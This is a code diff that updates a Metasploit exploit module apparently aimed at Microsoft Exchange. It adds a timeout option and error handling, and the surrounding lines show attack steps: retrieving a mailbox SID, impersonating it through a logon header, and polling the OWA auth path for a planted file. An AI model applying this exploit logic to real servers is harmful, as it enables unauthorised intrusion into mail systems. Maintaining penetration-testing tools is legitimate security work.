@@ -101,6 +101,7 @@ class MetasploitModule < Msf::Exploit::Remote
       OptBool.new('ForceExploit', [false, 'Override check result', false]),
       OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
       OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
+      OptString.new('TIMEOUT', [true, 'The number of seconds to wait for a reply from a HTTP request', 15]),
       OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
     ])
   end
@@ -174,6 +175,13 @@ class MetasploitModule < Msf::Exploit::Remote
     )
     fail_with(Failure::Unknown, 'No Autodiscover information was found') if response.body =~ %r{<ErrorCode>500</ErrorCode>}
 
+    case response.body
+    when %r{<ErrorCode>500</ErrorCode>}
+      fail_with(Failure::Unknown, 'No Autodiscover information was found')
+    when %r{<Action>redirectAddr</Action>}
+      fail_with(Failure::Unknown, 'No email address was found')
+    end
+
     xml = Nokogiri::XML.parse(response.body)
 
     legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
@@ -211,9 +219,9 @@ class MetasploitModule < Msf::Exploit::Remote
     if response.code == 200
       sid_regex = /S-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*/
 
-      sid = response.body.match(sid_regex)
+      sid = response.body.match(sid_regex).to_s
     end
-    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.to_s.empty?
+    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.empty?
 
     sid
   end
@@ -331,7 +339,7 @@ class MetasploitModule < Msf::Exploit::Remote
       received = send_request_cgi({
         'method' => 'GET',
         'uri' => normalize_uri("/owa/auth/#{remote_file}")
-      }, 2.5)
+      }, timeout = 2.5)
       if received && (received.code == 200)
         break
       end
@@ -363,7 +371,7 @@ class MetasploitModule < Msf::Exploit::Remote
     request = request.merge('headers' => { 'msExchLogonMailbox' => @sid }) unless @sid.empty?
     request = request.merge({ 'data' => data }) unless data.empty?
 
-    received = send_request_cgi(request)
+    received = send_request_cgi(request, timeout = datastore['TIMEOUT'])
     fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
 
     received
